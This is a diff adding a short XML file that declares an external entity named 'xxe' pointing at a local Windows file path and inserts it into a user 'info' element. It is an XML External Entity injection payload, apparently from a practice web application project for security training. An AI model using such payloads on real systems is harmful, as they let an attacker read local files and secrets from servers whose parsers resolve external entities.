@@ -1,0 +1,10 @@
+﻿<?xml version="1.0"?>
+
+<!DOCTYPE user [
+        <!ELEMENT user (info)>
+        <!ELEMENT info (#PCDATA)>
+        <!ENTITY xxe SYSTEM "file:///C:/Users/kaoko/Documents/Rider/RBS-Practise/WebApplication1/wwwroot/Data/Aleksandar/info.txt">
+        ]>
+<user>
+    <info>&xxe;</info>
+</user>
